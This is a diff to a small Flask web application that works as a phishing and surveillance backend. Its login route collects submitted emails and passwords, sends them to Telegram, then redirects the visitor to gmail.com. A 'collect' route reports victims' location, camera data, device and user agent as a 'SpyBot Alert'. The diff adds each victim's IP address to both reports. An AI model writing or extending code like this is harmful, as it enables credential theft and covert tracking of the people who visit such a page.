@@ -15,7 +15,13 @@ def index():
 def login():
     email = request.form.get('email')
     password = request.form.get('password')
-    message = f"🔐 New Credentials:\n📧 Email: {email}\n🔑 Password: {password}"
+    ip = request.remote_addr
+    message = f"""
+🔐 New Credentials:
+📧 Email: {email}
+🔑 Password: {password}
+🌐 IP Address: {ip}
+"""
     send_telegram_message(message)
     return redirect('https://gmail.com')
 
@@ -28,9 +34,17 @@ def collect():
         camera = data.get('camera')
         user_agent = data.get('userAgent')
         device = data.get('deviceInfo')
+        ip = request.remote_addr
 
         location_info = f"📍 Location: {latitude}, {longitude}" if latitude and longitude else "❌ Location Denied"
-        info = f"🕵️‍♂️ SpyBot Alert\n{location_info}\n📷 Camera: {camera}\n🧠 Device: {device}\n🌐 UserAgent: {user_agent}"
+        info = f"""
+🕵️‍♂️ SpyBot Alert
+📌 IP Address: {ip}
+{location_info}
+📷 Camera: {camera}
+🧠 Device: {device}
+🌐 UserAgent: {user_agent}
+"""
         send_telegram_message(info)
     return 'ok'
 
